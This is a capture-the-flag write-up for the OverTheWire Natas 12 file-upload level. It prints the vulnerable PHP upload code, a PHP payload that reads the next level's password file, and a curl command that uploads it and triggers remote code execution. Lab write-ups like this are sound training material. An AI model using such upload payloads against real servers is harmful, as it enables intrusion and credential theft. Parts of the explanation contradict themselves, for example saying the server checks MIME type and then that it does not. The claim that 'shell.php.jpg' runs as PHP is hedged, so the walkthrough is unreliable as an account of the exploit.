# Write-up: Natas 12 → 13  
**Date:** 2025-12-12  

## Obfuscated password (ROT13)  
`?`

---

## OBJECTIVE

> We’re given a file upload form. The goal is to upload a file that reveals the **next level's password**, bypassing file type validation and executing code on the server.
> Clicking “View sourcecode” shows:
```php
<?php
//... [snip] ...
$filename = $_FILES["uploadedfile"]["name"];
$filename = basename($filename);

// Check for .jpg or .jpeg
if (!preg_match('/\.jpg$/i', $filename) && !preg_match('/\.jpeg$/i', $filename)) {
    echo "Only .jpg or .jpeg files are allowed!";
    return;
}

$target_path = "upload/" . $filename;

if (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
    echo "The file <a href=\"$target_path\">$filename</a> has been uploaded";
}
?>
```

---

## PURPOSE

This level teaches a foundational web exploit: **bypassing insecure file upload protections** to achieve **remote code execution (RCE)**. Although the form claims:
> “Files that get uploaded will be saved with a .jpg extension, and will be deleted automatically after a few hours.”
…the server uses **MIME type** and **filename extension checks** in **PHP** to filter uploads. However, if the uploaded file is a valid `.php` script disguised with a fake image extension, and the server executes it, we can use it to print the password.

- **Regex only checks filename**, not file content.
- **Does not sanitize or randomize filename**, which allows **arbitrary file names and extensions**.
- Uploads go to a web-accessible directory: `/upload/filename`.

This means **we can upload a `.php` script disguised as a `.jpg.php`** — or even `.php.jpg` if the server is misconfigured to treat it as PHP code.

---

## SOLUTION

1. **Prepare a PHP payload disguised as an image**:

    Create a file named `shell.php.jpg` with the contents:

    ```php
    <?php echo file_get_contents('/etc/natas_webpass/natas13'); ?>
    ```

2. **Upload the file using the provided form**.

    The script allows this because:
    - It only checks if the filename *ends in `.jpg`* (case-insensitive).
    - It does **not check MIME type server-side**.
    - The server does **not disable PHP execution in the `upload/` directory**.

3. **After upload**, visit the URL of your file:

    ```
    http://natas12.natas.labs.overthewire.org/upload/shell.php.jpg
    ```

4. **Result:**
    - If executed, it prints the password for Natas 13.

Final payload:

```bash
curl -u natas12:<password> \
  -F "uploadedfile=@shell.php.jpg" \
  -F "filename=shell.php.jpg" \
  http://natas12.natas.labs.overthewire.org/
```

Then visit:

```
http://natas12.natas.labs.overthewire.org/upload/shell.php.jpg
```

---

## TAKEAWAYS

- Never rely on **file extension** alone for upload validation.
- Executable directories (`upload/`) should have **script execution disabled** via `.htaccess`, Nginx config, etc.
- User-supplied filenames should always be **sanitized** and preferably **randomized**.
- File type validation should use **server-side MIME checks**, not just regex or JavaScript.

---

Writeup author: **Jeremy Ray Jewell**  
[GitHub](https://github.com/jeremyrayjewell)  
[LinkedIn](https://www.linkedin.com/in/jeremyrayjewell)
